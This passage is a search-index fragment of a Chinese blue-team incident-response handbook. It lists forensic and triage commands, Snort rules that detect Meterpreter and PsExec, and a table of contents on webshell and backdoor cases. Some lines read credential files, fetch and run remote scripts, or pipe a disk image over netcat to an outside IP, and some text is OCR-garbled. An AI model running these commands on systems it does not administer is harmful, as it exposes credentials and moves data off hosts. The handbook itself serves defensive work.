\"HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\" /s C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\" /f Appinit_DLLs C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\" /f Shell C:\\> reg query \"HKLM\\SOFTWARE\\Mic rosoft\\WindowsNT\\CurrentVersion\\Winlogon\" /f Userinit C:\\> reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Systern\\Scripts\" C:\\> reg query \"HKLM\\SOFTWARE\\Classes\\batfile\\shell\\open\\cornrnand\" C:\\> reg query \"HKLM\\SOFTWARE\\Classes\\cornfile\\shell\\open\\cornrnand\" C:\\> reg query \"HKLM\\SOFTWARE\\Classes\\exefile\\shell\\open\\command\" C:\\> reg query \"HKLM\\SOFTWARE\\Classes\\htafile\\Shell\\Open\\Command\" C:\\> reg query \"HKLM\\SOFTWARE\\Classes\\piffile\\shell\\open\\command\" C:\\> reg query \"HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects\" /s C:\\> reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\" C:\\> reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\KnownDLLs\" C:\\> reg query \"HKLM\\SYSTEM\\ControlSet001\\Control\\SessionManager\\KnownDLLs\" 7.\uff09\u53d6\u65e5\u5fd7\u6587\u4ef6 C:\\> wevtutil epl Security C:\\bak\\Security-logs.evtx C:\\> wevtutil epl System C:\\bak\\System-logs.evtx C:\\> wevtutil epl Application C:\\bak\\Application-logs.evtx 8.\uff09\u6587\u4ef6\u3001\u76ee\u5f55\u3001\u5171\u4eab\u4fe1\u606f C:\\> net use \\\\\u76ee\u6807IP C:\\> net share C:\\> net session C:\\> wmic volume list brief C:\\> wmic logicaldisk get description,filesystem,name,size C:\\> wmic share get name,path \\# \u67e5\u627e\u591a\u4e2a\u7c7b\u578b\u7684\u6587\u4ef6\u6216\u67d0\u4e2a\u6587\u4ef6 C:\\> dir /A /S /T:A *.exe *.dll *.bat *.PS1 *.zip C:\\> dir /A /S /T:A evil.exe \\# \u67e5\u627e2017/1/1\u4e4b\u540e\u521b\u5efa\u7684\u6587\u4ef6 C:\\> forfiles /p C:\\ /M *.exe /S /D +2017/1/1 /C \"cmd /c echo @fdate @ftime @path\" C:\\> for %G in (.exe, .dll, .bat, .ps) do forfiles -p \"C:\" -m *%G -s -d +2017/1/1 -c \"cmd /c echo @fdate @ftime @path\" \\# \u67e5\u627e\u6587\u4ef6\u5927\u5c0f>20MB\u7684\u6587\u4ef6 forfiles /S /M * /C \"cmd /c if @fsize GEQ 2097152 echo @path @fsize\" \\# \u5728Alternate Data Streams\u4e2d\u67e5\u627e\u6587\u4ef6 C:\\> streams -s \u6587\u4ef6\u6216\u76ee\u5f55 \\# \u68c0\u67e5\u6570\u5b57\u7b7e\u540d\uff0cvt\u626b\u63cf C:\\> sigcheck -e -u -vr -s C:\\ C:\\> listdlls.exe -u \\# \u626b\u63cf\u75c5\u6bd2 C:\\> \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -SignatureUpdate C:\\> \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -Scan 4.2 ) LIVE TRIAGE\uff08\u6536\u96c6\u8fd0\u884c\u65f6\u7cfb\u7edf\u4fe1\u606f\uff09 4.2.1 LINUX\u7bc7 1.\uff09\u7cfb\u7edf\u4fe1\u606f uname -a uptime timedatectl mount 2.\uff09\u7528\u6237\u4fe1\u606f w lastlog last faillog -a cat /etc/passwd cat /etc/shadow cat /etc/group cat /etc/sudoers \\# \u67e5\u627eUID\u4e3a0\u7684\u7528\u6237 awk -F: '($3 == \"0\") {print}' /etc/passwd egrep ':0+' /etc/passwd cat /root/.ssh/authorized_keys lsof -u root cat /root/.bash_history 3.\uff09\u7f51\u7edc\u4fe1\u606f \\# \u67e5\u770b\u7f51\u7edc\u63a5\u53e3 ifconfig OR ip a l \\# \u67e5\u770b\u76d1\u542c\u7aef\u53e3 netstat -tupnl \\# \u67e5\u770b\u7f51\u7edc\u8fde\u63a5 netstat -tupnla netstat -tupnlax \\# \u8def\u7531\u4fe1\u606f route OR netstat -r OR ip r l \\# ARP\u8868 arp -ne \\# \u76d1\u542c\u7aef\u53e3\u7684\u8fdb\u7a0b lsof -i 4.\uff09\u670d\u52a1\u4fe1\u606f \\# \u5217\u51fa\u6240\u6709\u8fdb\u7a0b ps aux OR ps -ef \\# \u5df2\u52a0\u8f7d\u5185\u6838\u6a21\u5757 lsmod \\# \u6253\u5f00\u7684\u6587\u4ef6 lsof lsof -c sshd lsof -p PID lsof -nPi | cut -f1 -d\" \" | uniq | tail -n +2 \\# \u76d1\u63a7\u65e5\u5fd7 less +F /var/log/messages tail -F /var/log/messages journalctl -u ssh.service -f \\# \u5217\u51fa\u6240\u6709\u670d\u52a1 chkconfig --list systemctl list-units 5.\uff09\u7b56\u7565\u3001\u8865\u4e01\u3001\u73af\u5883\u53d8\u91cf\u4fe1\u606f \\# \u68c0\u67e5pam.d\u76ee\u5f55\u76f8\u5173\u6587\u4ef6 cat /etc/pam.d/common* \\# \u81ea\u542f\u52a8\u4fe1\u606f - \u8ba1\u5212\u4efb\u52a1 crontab -l crontab -u root -l cat /etc/crontab ls /etc/cron,* 6.\uff09\u547d\u4ee4\u5386\u53f2 cat /root/.*history 7.\uff09\u6587\u4ef6\u3001\u76ee\u5f55\u3001\u5171\u4eab\u4fe1\u606f df -ah ls -lhcta /etc/init.d/ stat -x filename file filename \\# \u7279\u6b8a\u5c5e\u6027\u6587\u4ef6 lsattr -R / | grep \"\\-i-\" \\# \u5168\u5c40\u53ef\u5199\u6587\u4ef6 find / -xdev -type d \\( -perm -0002 -a ! -perm -1000 \\) -print \\# \u67d0\u65f6\u95f4\u70b9\u4e4b\u540e\u65b0\u5efa\u7684\u6587\u4ef6 find / -newermt 2018-01-22q \\# \u6253\u5370\u6587\u4ef6\u7684\u6240\u6709\u5c5e\u6027\u4fe1\u606f find /labs -printf \"%m;%Ax;%AT;%Tx;%TT;%Cx;%CT;%U;%G;%s;%p\\n\" \\# \u67e5\u770b\u6587\u4ef6\u7684\u5143\u6570\u636e stat \u6587\u4ef6\u540d 8.) \u7b80\u5355\u57fa\u7ebf\u68c0\u67e5 wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/1_x/unix-privesc-check && ./unix-privesc-check > output.txt 9.) \u68c0\u6d4brootkit chkrootkit rkhunter --update && rkhunter -check tiger && less /var/log/tiger/security.report.* lynis && lynis audit system && more /var/logs/lynis. log 10.) Fastir Collector Linux\uff0c\u6536\u96c6artefacts\uff0c\u5305\u62ec\uff1a\u5185\u6838\u7248\u672c\u3001\u5185\u6838\u6a21\u5757\u3001\u7f51\u5361\u3001\u7cfb\u7edf\u7248\u672c\u3001\u4e3b\u673a\u540d\u3001\u767b\u5f55\u3001\u7f51\u7edc\u8fde\u63a5\u3001SSH know_host\u3001\u65e5\u5fd7\u6587\u4ef6\u3001\u8fdb\u7a0b\u6570\u636e\u3001\u81ea\u542f\u52a8\u7b49\u4fe1\u606f wget https://raw.githubusercontent.com/SekoiaLab/Fastir_Collector_Linux/master/fastIR_collector_linux.pypython fastIR_collector_linux.py --debug --output_dir output 11.) Sysdig and Sysdig Falco \u884c\u4e3a\u76d1\u63a7 \\# \u89c2\u5bdfroot\u7528\u6237\u67e5\u770b\u8fc7\u7684\u76ee\u5f55 sysdig -p\"%evt.arg.path\" \"evt.type=chdir and user.name=root\" \\# \u89c2\u5bdfSSHD\u884c\u4e3a sysdig -A -c echo_fds fd.name=/dev/ptmx and proc.name=sshd \\# id\u4e3a5459\u7684\u767b\u5f55shell\u6267\u884c\u8fc7\u7684\u6240\u6709\u547d\u4ee4 sysdig -r trace.scap.gz -c spy_users proc.loginshellid=5459 \\# \u5b89\u88c5\uff0c\u542f\u52a8falco curl -s https://s3.amazonaws.com/download.draios.com/DRAIOS-GPG-KEY.public | apt-key add - curl -s -o /etc/apt/sources.list.d/draios.list http://download.draios.com/stable/deb/draios.list sudo apt update apt -y install falco modprobe sysdig-probe service falco start falco 4.3 ) \u75c5\u6bd2\u6837\u672c\u5206\u6790 \\# \u9759\u6001\u5206\u6790 \\# \u6302\u8f7dSysinternals\u5de5\u5177\u96c6 \\\\live.sysinternals.com\\tools \\# \u68c0\u67e5\u6570\u5b57\u7b7e\u540d C:\\> sigcheck.exe -u -e C:\\malware C:\\> sigcheck.exe -vt malware.exe \\# 16\u673a\u5236\u548cASCII\u65b9\u5f0f\u67e5\u770bPE\u6587\u4ef6 hexdump -C -n 500 malware.exe od -x mailware.exe xxd malware.exe strings -a malware.exe | more \\# \u5185\u5b58\u955c\u50cf\u5206\u6790 python vol.py -f malware_memory_dump.raw -profile=Win7SPFix64 malfind -D /output python vol.py -f malware_memory_dump.raw -profile=Win7SPFix64 malfind -p PID -D /output python vol.py -f malware_memory_dump.raw -profile=Win7SPFix64 pslist python vol.py -f malware_memory_dump.raw -profile=Win7SPFix64 pstree python vol.py -f malware_memory_dump.raw -profile=Win7SPFix64 dlllist python vol.py -f malware_memory_dump.raw -profile=Win7SPFix64 dlldump -D /output \\# HASH\u5206\u6790 curl -v --request POST --url https://www.virustotal.com/vtapi/v2/file/report' -d apikey=VT API KEY -d 'resource=\u6837\u672c\u6587\u4ef6hash' curl -v -F 'file=malware.exe' -F apikey=VT API KEY>https://www.virustotal.com/vtapi/v2/file/scan whois -h hash,cymru.com \u6837\u672c\u6587\u4ef6hash \\# \u83b7\u53d6\u78c1\u76d8\u548c\u5185\u5b58\u955c\u50cf \\# WINDOWS C:\\> psexec.exe \\\\IP -u <DOMAIN>\\administrator -p 123 -c mdd_l.3.exe --o C:\\memory.dmp C:\\> dc3dd.exe if=\\\\.\\c: of=d:\\diskiamge.dd hash=md5 log=d:\\output.log \\# LINUX dd if=/dev/fmem of=/tmp/mem_dump.dd \\# \u4f7f\u7528LiME get https://github.com/504ensicslabs/LiME/archive/master.zip unzip master.zip cd LiME-master/src make cp lime-*.ko /media/USB/ insmod lime-3.13.0-79-generic.ko \"path=/media/USB/mem_dump.lime format= raw\" \\# \u4ece\u5185\u5b58\u4e2d\u62f7\u8d1dPE\u6587\u4ef6 cp /proc/\u8fdb\u7a0bID/exe /output \\# \u521b\u5efa\u8fdb\u7a0bcore dump gcore \u8fdb\u7a0bID strings -a gcore.* | more dd if=/dev/sda of=/root/sda.dd dd if=/dev/sda | ssh root@RemoteIP \"dd of=/root/sda.dd\" \\# \u901a\u8fc7netcat\u4f20\u9001\u63a5\u6536\u955c\u50cf\u6587\u4ef6 bzip2 -c /dev/sda | nc 8.8.8.8 53 nc -p 53 -l | bzip2 -d | dd of=/root/sda.dd","title":"4. ) \u54cd\u5e94\uff08\u53d6\u8bc1\uff09"},{"location":"blueteam/%E8%93%9D%E9%98%9F%E6%89%8B%E5%86%8C/#5-tips-tricks","text":"5.1 ) \u6280\u5de7 5.1.1 WINDOWS\u7cfb\u7edf\u7bc7 \\# \u5c06\u547d\u4ee4\u7ed3\u679c\u901a\u8fc7\u7ba1\u9053\u8f93\u51fa\u5230\u7c98\u5e16\u677f\uff0c\u7136\u540e\u5c06\u7c98\u5e16\u677f\u7684\u5185\u5bb9\u91cd\u5b9a\u5411\u5230\u6587\u4ef6 C:\\> some_command.exe | clip PS C:\\> Get-Clipboard > clip.txt \\# \u68c0\u67e5\u6ce8\u518c\u8868\u67d0\u8def\u5f84\u662f\u5426\u5b58\u5728 PS C:\\> Test-Path \"HKCU:\\Software\\Microsoft\\123\" \\# \u53ef\u9760\u6587\u4ef6\u590d\u5236 robocopy c:\\src \\\\\u76ee\u6807\u8ba1\u7b97\u673a\\dst /E \\# \u68c0\u67e5\u67d0\u76ee\u5f55\u662f\u5426\u5b58\u5728ps1,vbs\u6269\u5c55\u7684\u6587\u4ef6 PS C:\\> Test-Path C:\\Scripts\\Archive\\* -include *.ps1, *.vbs \\# \u5408\u5e76\u591a\u4e2a\u6587\u4ef6 C:\\> type 1.txt 2.txt > output.txt \\# \u591a\u4e2a\u684c\u9762\u7a97\u53e3\uff08Desktops\uff09 C:\\>\"%ProgramFiles%\\Internet Explorer\\iexplore.exe\" https://live.sysinternals.com/desktops.exe \\# \u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u6267\u884c\u547d\u4ee4 C:\\> psexec.exe \\\\\u8fdc\u7a0b\u8ba1\u7b97\u673a -u admin -p 123 /c c:\\123.exe PS C:\\> Invoke-Command -\u8fdc\u7a0b\u8ba1\u7b97\u673a { ls } \\# \u6bd4\u8f83\u4e24\u4e2a\u6587\u4ef6\u7684\u5dee\u5f02 PS C:\\> Compare-Object (-Content 1.log) -DifferenceObject (Get-Content 2.log) \\# \u8fdb\u5236\u8f6c\u6362\u4e0e\u7f16\u7801 C:\\> set /a 0xff PS C:\\> 0xff C:\\> certutil -decode BASE64\u7f16\u7801\u6587\u4ef6 output.file \\# \u89e3\u7801XOR\uff0c\u641c\u7d22\u5173\u952e\u5b57\uff1ahttp C:\\> xorsearch.exe -i -s input.file http 5.1.2 LINUX\u7cfb\u7edf\u7bc7 \\# \u901a\u8fc7ssh\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u6293\u5305 ssh root@8.8.8.8 tcpdump -i any -U -s 0 -w - 'not port 22' 5.2 ) SNORT # SNORT\u89c4\u5219\u68c0\u6d4bMeterpreter \\# Snort rules by Didier Stevens (http://DidierStevens.com) alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"Metasploit Meterpreter\"; flow:to_server,established; content:\"RECV\"; http_client_body; depth:4; fast_pattern; isdataat:!0,relative; urilen:23<>24,norm; content:\"POST\"; pcre:\"/^\\/[a-z0-9]{4,5}_[a-z0-9]{16}\\/$/Ui\"; classtype:trojan-activity; reference:url,blog.didierstevens.com/2015/05/11/detecting-network-traffic-from-metasploits-meterpreter-reverse-http-module/; sid:1618008; rev:1;) https://didierstevens.com/files/software/snort-rules-V0_0_1.zip \\# SNORT\u89c4\u5219\u68c0\u6d4bPSEXEC alert tcp $HOME_NET any -> $HOME_NET [139,445] (msg:\"POLICY-OTHER use of psexec remote administration tool\"; flow:to_server,established; content:\"|FF|SMB|A2|\"; depth:5; offset:4; content:\"|5C 00|p|00|s|00|e|00|x|00|e|00|c|00|s|00|v|00|c\"; nocase; metadata:service netbios-ssn; reference:url,technet.microsoft.com/en-us/sysinternals/bb897553.aspx; classtype:policy-violation; sid:24008; rev:1;) alert tcp $HOME_NET any -> $HOME_NET [139,445] (msg:\"POLICY-OTHER use of psexec remote administration tool SMBv2\"; flow:to_server,established; content:\"|FE|SMB\"; depth:8; nocase; content:\"|05 00|\"; within:2; distance:8; content:\"P|00|S||E|00|X|00|E|00|S|00|V|00|C|00|\"; fast_pattern:only; metadata:service netbios-ssn; reference:url,technet.microsoft.com/en-us/sysinternals/bb897553.aspx; classtype:policy-violation; sid:30281; rev:1;) 5.3 ) Bro NSM # \u68c0\u6d4b\u6a2a\u5411\u6e17\u900f wget https://raw.githubusercontent.com/richiercyrus/Bro-Scripts/master/detect-mal-smb-files.bro bro -r faf-exercise.pcap detect-mal-smb-files.bro less notice.log \\# \u68c0\u6d4b\u52d2\u7d22\u8f6f\u4ef6 wget https://raw.githubusercontent.com/fox-it/bro-scripts/master/smb-ransomware/smb-ransomware.bro bro -r faf-exercise.pcap smb-ransomware.bro 5.4 ) \u68c0\u6d4bDOS/DDOS # \u68c0\u6d4b\u653b\u51fb\u7c7b\u578bSYN Flood\uff0cICMP Flood\uff0cUDP Flood tshark -r 001.pcap -q -z io,phs tshark -c 1000 - -z io,phs tcpdump -tnr $ | awk -F '.' '{print $1\".\"$2\".\"$3\".\"$4}' | sort | uniq -c | sort -n | tail tcpdump -qnn \"tcp[tcpflags] & (tcp-syn) != 0\" netstat -s tcpdump -nn not arp and not icmp and not udp netstat -n | awk '{print $6}' | sort | uniq -c | sort -nr | head \\# \u5e94\u7528\u5c42 tshark -c 10000 -T fields -e http.host | sort | uniq -c | sort -r | head -n 10 tshark -r capture6 -T fields -e http.request.full\\_uri | sort | uniq -c | sort -r | head -n 10c tcpdump -n 'tcp[32:4] = 0x47455420' | cut -f 7- -d\":\" \\# \u67e5\u627ehttp\u8bf7\u6c42\u4e2d\u5305\u542b\uff1aGIF,ZIP,JPEG,PDF,PNG\u6269\u5c55\u7684\u6570\u636e\u5305 tshark -Y \"http contains \"ff:d8\"\" || \"http contains \"GIF89a\"\" || \"http contains \"\\x50\\x4B\\x03\\x04\"\" || \"http contains \"\\xff\\xd8\"\" || \"http contains \"%PDF\"\" || \"http contains \"\\x89\\x50\\x4E\\x47\"\" \u53d6'user-agent'\u548crefer\u5b57\u6bb5 tcpdump -c 1000 -Ann I grep -Ei 'user-agent' | sort | uniq -c | sort -nr | head -10 tcpdump -i en0 -A -s 500 | grep -i refer \\# \u7b2c\u4e8c\u5c42\u653b\u51fb tcpdump 'arp or icmp' tcpdump -tnr 001.pcap ARP | awk -F '.' '{print $1\".\"$2\".\"$3\".\"$4}' | sort | uniq -c | sort -n | tail tshark -r 001.pcap -q -z io,phs | grep arp.duplicate-address-detected 5.5 ) \u84dd\u961f\u5175\u5668\u8c31 6.4.1\uff09 KALI \u6e17\u900f\u6d4b\u8bd5\u53d1\u884c\u7248 https://www.kali.org 6.4.2\uff09SIFT SANS \u53d6\u8bc1\u5de5\u5177\u7bb1 http://sift.readthedocs.org/ 6.4.3\uff09REMNUX \u8f6f\u4ef6\u9006\u5411\u548c\u75c5\u6bd2\u5206\u6790\u53d1\u884c\u7248 https://remnux.org 6.4.4\uff09OPENVAS http://www.openvas.org 6.4.5\uff09Security Onion \u5165\u4fb5\u68c0\u6d4b\u3001\u7f51\u7edc\u5b89\u5168\u76d1\u63a7\u3001\u65e5\u5fd7\u5206\u6790\u53d1\u884c\u7248 https://securityonion.net 6.4.6\uff09OSSEC \u5f00\u6e90\u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf http://ossec.github.io","title":"5. ) \u5e38\u7528\u6280\u5de7\uff08TIPS &amp; TRICKS\uff09"},{"location":"blueteam/%E8%93%9D%E9%98%9F%E6%89%8B%E5%86%8C/#_1","text":"\u9879\u76ee\u5730\u5740\uff1a https://github.com/Zer0d0y/BTFM \uff0c\u6b22\u8fce\u6709\u7ecf\u9a8c\u7684\u670b\u53cb\u4e00\u8d77\u7ef4\u62a4\uff01","title":"\u6587\u6863\u7ef4\u62a4"},{"location":"blueteam/%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/","text":"\u9879\u76ee\u76ee\u5f55 \u00b6 \u642c\u7816bypass007\uff0c\u5e94\u6025\u54cd\u5e94\u7b14\u8bb0 [\u7b2c\u4e00\u7ae0\uff1a\u5165\u4fb5\u6392\u67e5\u7bc7] \u7b2c1\u7bc7\uff1aWindow\u5165\u4fb5\u6392\u67e5 \u7b2c2\u7bc7\uff1aLinux\u5165\u4fb5\u6392\u67e5 \u7b2c3\u7bc7\uff1a\u5e38\u89c1\u7684Webshell\u67e5\u6740\u5de5\u5177 \u7b2c4\u7bc7\uff1a\u5982\u4f55\u53d1\u73b0\u9690\u85cf\u7684Webshell\u540e\u95e8 \u7b2c5\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357 [\u7b2c\u4e8c\u7ae0\uff1a\u65e5\u5fd7\u5206\u6790\u7bc7] \u7b2c1\u7bc7:Window\u65e5\u5fd7\u5206\u6790 \u7b2c2\u7bc7:Linux\u65e5\u5fd7\u5206\u6790 \u7b2c3\u7bc7:Web\u65e5\u5fd7\u5206\u6790 \u7b2c4\u7bc7:MSSQL\u65e5\u5fd7\u5206\u6790 \u7b2c5\u7bc7:MySQL\u65e5\u5fd7\u5206\u6790 [\u7b2c\u4e09\u7ae0\uff1a\u6743\u9650\u7ef4\u6301\u7bc7] \u7b2c1\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7 \u7b2c2\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7 \u7b2c3\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7 \u7b2c4\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7 \u7b2c5\u7bc7\uff1aWindows\u547d\u4ee4\u884c\u6587\u4ef6\u4e0b\u8f7d\u65b9\u5f0f\u6c47\u603b \u7b2c6\u7bc7\uff1a\u4e09\u5927\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u6743\u9650\u7ef4\u6301\u6280\u672f \u7b2c7\u7bc7\uff1a\u5e38\u89c1WebShell\u7ba1\u7406\u5de5\u5177 [\u7b2c\u56db\u7ae0:Windows\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1aFTP\u66b4\u529b\u7834\u89e3 \u7b2c2\u7bc7\uff1a\u8815\u866b\u75c5\u6bd2 \u7b2c3\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2 \u7b2c4\u7bc7\uff1aARP\u75c5\u6bd2 \u7b2c5\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e00\uff09 \u7b2c6\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e8c\uff09 [\u7b2c\u4e94\u7ae0\uff1aLinux\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1aSSH\u66b4\u529b\u7834\u89e3 \u7b2c2\u7bc7\uff1a\u6355\u6349\u77ed\u8fde\u63a5 \u7b2c3\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2 \u7b2c4\u7bc7\uff1a\u76d6\u8328\u6728\u9a6c \u7b2c5\u7bc7\uff1aDDOS\u75c5\u6bd2 \u7b2c6\u7bc7\uff1aShell\u75c5\u6bd2 [\u7b2c\u516d\u7ae0\uff1aWeb\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1a\u7f51\u7ad9\u88ab\u690d\u5165Webshell \u7b2c2\u7bc7\uff1a\u95e8\u7f57\u5e01\u6076\u610f\u6316\u77ff \u7b2c3\u7bc7\uff1a\u6279\u91cf\u6302\u9ed1\u9875 \u7b2c4\u7bc7\uff1a\u65b0\u95fb\u6e90\u7f51\u7ad9\u52ab\u6301 \u7b2c5\u7bc7\uff1a\u79fb\u52a8\u7aef\u52ab\u6301 \u7b2c6\u7bc7\uff1a\u641c\u7d22\u5f15\u64ce\u52ab\u6301 \u7b2c7\u7bc7\uff1a\u7f51\u7ad9\u9996\u9875\u88ab\u7be1\u6539 \u7b2c8\u7bc7\uff1a\u7ba1\u7406\u5458\u8d26\u53f7\u88ab\u7be1\u6539 \u7b2c9\u7bc7\uff1a\u7f16\u8f91\u5668\u5165\u4fb5\u4e8b\u4ef6","title":"\u76ee\u5f55"},{"location":"blueteam/%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/#_1","text":"\u642c\u7816bypass007\uff0c\u5e94\u6025\u54cd\u5e94\u7b14\u8bb0 [\u7b2c\u4e00\u7ae0\uff1a\u5165\u4fb5\u6392\u67e5\u7bc7] \u7b2c1\u7bc7\uff1aWindow\u5165\u4fb5\u6392\u67e5 \u7b2c2\u7bc7\uff1aLinux\u5165\u4fb5\u6392\u67e5 \u7b2c3\u7bc7\uff1a\u5e38\u89c1\u7684Webshell\u67e5\u6740\u5de5\u5177 \u7b2c4\u7bc7\uff1a\u5982\u4f55\u53d1\u73b0\u9690\u85cf\u7684Webshell\u540e\u95e8 \u7b2c5\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357 [\u7b2c\u4e8c\u7ae0\uff1a\u65e5\u5fd7\u5206\u6790\u7bc7] \u7b2c1\u7bc7:Window\u65e5\u5fd7\u5206\u6790 \u7b2c2\u7bc7:Linux\u65e5\u5fd7\u5206\u6790 \u7b2c3\u7bc7:Web\u65e5\u5fd7\u5206\u6790 \u7b2c4\u7bc7:MSSQL\u65e5\u5fd7\u5206\u6790 \u7b2c5\u7bc7:MySQL\u65e5\u5fd7\u5206\u6790 [\u7b2c\u4e09\u7ae0\uff1a\u6743\u9650\u7ef4\u6301\u7bc7] \u7b2c1\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7 \u7b2c2\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7 \u7b2c3\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7 \u7b2c4\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7 \u7b2c5\u7bc7\uff1aWindows\u547d\u4ee4\u884c\u6587\u4ef6\u4e0b\u8f7d\u65b9\u5f0f\u6c47\u603b \u7b2c6\u7bc7\uff1a\u4e09\u5927\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u6743\u9650\u7ef4\u6301\u6280\u672f \u7b2c7\u7bc7\uff1a\u5e38\u89c1WebShell\u7ba1\u7406\u5de5\u5177 [\u7b2c\u56db\u7ae0:Windows\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1aFTP\u66b4\u529b\u7834\u89e3 \u7b2c2\u7bc7\uff1a\u8815\u866b\u75c5\u6bd2 \u7b2c3\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2 \u7b2c4\u7bc7\uff1aARP\u75c5\u6bd2 \u7b2c5\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e00\uff09 \u7b2c6\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e8c\uff09 [\u7b2c\u4e94\u7ae0\uff1aLinux\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1aSSH\u66b4\u529b\u7834\u89e3 \u7b2c2\u7bc7\uff1a\u6355\u6349\u77ed\u8fde\u63a5 \u7b2c3\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2 \u7b2c4\u7bc7\uff1a\u76d6\u8328\u6728\u9a6c \u7b2c5\u7bc7\uff1aDDOS\u75c5\u6bd2 \u7b2c6\u7bc7\uff1aShell\u75c5\u6bd2 [\u7b2c\u516d\u7ae0\uff1aWeb\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1a\u7f51\u7ad9\u88ab\u690d\u5165Webshell \u7b2c2\u7bc7\uff1a\u95e8\u7f57\u5e01\u6076\u610f\u6316\u77ff \u7b2c3\u7bc7\uff1a\u6279\u91cf\u6302\u9ed1\u9875 \u7b2c4\u7bc7\uff1a\u65b0\u95fb\u6e90\u7f51\u7ad9\u52ab\u6301 \u7b2c5\u7bc7\uff1a\u79fb\u52a8\u7aef\u52ab\u6301 \u7b2c6\u7bc7\uff1a\u641c\u7d22\u5f15\u64ce\u52ab\u6301 \u7b2c7\u7bc7\uff1a\u7f51\u7ad9\u9996\u9875\u88ab\u7be1\u6539 \u7b2c8\u7bc7\uff1a\u7ba1\u7406\u5458\u8d26\u53f7\u88ab\u7be1\u6539 \u7b2c9\u7bc7\uff1a\u7f16\u8f91\u5668\u5165\u4fb5\u4e8b\u4ef6","title":"\u9879\u76ee\u76ee\u5f55"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Untitled%201/","text":"","title":"Untitled 1"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Untitled/","text":"","title":"Untitled"},{"location":"redteam/Untitled/","text":"","title":"Untitled"},{"location":"redteam/cobalt%20strike/","text":"Beacons\u7684\u4ecb\u7ecd \u00b6 Beacon\u662fCobalt Strike\u4e3a\u9ad8\u7ea7\u653b\u51fb\u8005\u5efa\u6a21\u7684Payload\u3002\u4f7f\u7528Beacon\u901a\u8fc7HTTP\uff0cHTTPS \u6216DNS\u51fa\u53e3\u7f51\u7edc\u3002\u800c\u4e14Beacon\u975e\u5e38\u7075\u6d3b\uff0c\u652f\u6301\u5f02\u6b65\u548c\u4ea4\u4e92\u5f0f\u901a\u4fe1\u3002\u5f02\u6b65\u901a\u4fe1\u65e2\u4f4e\u53c8\u6162\u3002 Beacon\u5c06\u901a\u8baf\u672c\u5730\uff0c\u4e0b\u8f7d\u4efb\u52a1\uff0c\u7136\u540e\u8fdb\u5165\u7761\u7720\u72b6\u6001\u3002\u4ea4\u4e92\u5f0f\u901a\u4fe1\u5b9e\u65f6\u53d1\u751f\u3002 Cobalt Strike\u80fd\u591f\u5c06\u591a\u4e2aBeacons\u94fe\u63a5\u5230\u4e00\u4e2a\u94fe\u4e2d\u3002\u8fd9\u4e9b\u94fe\u63a5\u7684Beacon\u63a5\u6536\u5b83\u4eec\u7684\u547d \u4ee4\uff0c\u5e76\u901a\u8fc7\u5176\u94fe\u4e2d\u7684\u7236Beacon\u53d1\u9001\u5b83\u4eec\u7684\u8f93\u51fa\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u94fe\u63a5\u5bf9\u4e8e\u63a7\u5236\u54ea\u4e9b\u4f1a\u8bdd\u6d41\u51fa 